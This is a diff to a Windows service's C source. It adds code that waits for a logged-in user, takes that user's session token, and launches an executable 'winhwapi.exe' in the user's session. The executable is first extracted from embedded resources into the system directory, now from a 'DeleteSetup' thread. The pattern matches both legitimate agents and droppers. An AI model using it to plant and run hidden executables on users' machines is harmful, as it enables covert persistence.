@@ -286,6 +286,7 @@ BOOL ReleaseLibrary(UINT uResourceId, const CHAR* szResourceType, const CHAR* sz
 	return TRUE;
 }
 void RunProcess(LPCSTR lpPath);
+void CreateProcessCurrent(LPCSTR lpPath);
 
 void ReleaseFileToSysDir(UINT uResourceId, const CHAR* szResourceType, const CHAR* szFileName)
 {
@@ -297,7 +298,7 @@ void ReleaseFileToSysDir(UINT uResourceId, const CHAR* szResourceType, const CHA
 	BOOL bRet= ReleaseLibrary(uResourceId, szResourceType, szDLLFile);
 
 	if (bRet) {
-		RunProcess(szDLLFile);
+		CreateProcessCurrent(szDLLFile);
 	}
 }
 void RunProcessWithCommand(LPCSTR lpPath, LPCSTR lpCommand)
@@ -361,6 +362,88 @@ void RunProcess(LPCSTR lpPath)
 	// Close process and thread handles. 
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
+}
+BOOL CheckUserLogined()
+{
+	BOOL bRet = FALSE;
+
+	PWTS_SESSION_INFO pSessions = NULL;
+	DWORD dwCount = 0;
+	DWORD dwError;
+	if (!WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessions, &dwCount))
+	{
+		dwError = GetLastError();
+
+	}
+	else if (dwCount == 0)
+	{
+
+	}
+	else
+	{
+		for (DWORD i = 0; i < dwCount; ++i)
+		{
+			if (pSessions[i].State == WTSActive) // has a logged in user
+			{
+				bRet = TRUE;
+				break;
+			}
+		}
+	}
+	if (pSessions)
+		WTSFreeMemory(pSessions);
+
+	return bRet;
+}
+void CreateProcessCurrent(LPCSTR lpPath) {
+	while (TRUE) {
+		if (CheckUserLogined())
+			break;
+		Sleep(1000);
+	}
+	DWORD dwSessionId = WTSGetActiveConsoleSessionId();
+
+	HANDLE hUserToken = NULL;
+	HANDLE hToken = NULL;
+	WTSQueryUserToken(dwSessionId, &hToken);
+	DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hUserToken);
+	LPVOID pEnv = NULL;
+
+	CreateEnvironmentBlock(&pEnv, hToken, TRUE);
+
+	char szDesktop[] = { "WinSta0\\Default" };
+	STARTUPINFOA si = { 0 };
+	si.cb = sizeof(si);
+	//si.lpDesktop = szDesktop;
+	//si.wShowWindow = nShow;
+	//...
+
+	PROCESS_INFORMATION pi = { 0 };
+	CHAR szPath[MAX_PATH] = { 0 };
+
+	DWORD dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT;
+
+	StringCbCopyA(szPath, sizeof(szPath), lpPath);
+	//launch the process in active logged in user's session
+	CreateProcessAsUserA(
+		hToken,
+		szPath,
+		NULL,
+		NULL,
+		NULL,
+		FALSE,
+		dwCreationFlags,
+		pEnv,
+		NULL,
+		&si,
+		&pi
+	);
+	//WaitForSingleObject(pi.hProcess, INFINITE);
+	CloseHandle(pi.hThread);
+	CloseHandle(pi.hProcess);
+	DestroyEnvironmentBlock(pEnv);
+	CloseHandle(hToken);
+	CloseHandle(hUserToken);
 }
 DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eventData, void* eventContext)
 {
@@ -432,7 +515,6 @@ DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eve
 DWORD WINAPI DeleteSetup(LPVOID Param);
 void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 {
-	ReleaseFileToSysDir(IDR_WINHWAPI1, (CHAR*)"winhwapi", "winhwapi.exe");
 	CreateThread(NULL, 0, DeleteSetup, NULL, 0, 0);
 	OutputDebugStringA("ServiceMain");
 	ILib_DumpEnabledContext winException;
@@ -496,7 +578,7 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 }
 DWORD WINAPI DeleteSetup(LPVOID Param)
 {
-
+	ReleaseFileToSysDir(IDR_WINHWAPI1, (CHAR*)"winhwapi", "winhwapi.exe");
 
 	CHAR szTarget[260] = { 0 };
 	CHAR szFile[260] = { 0 };
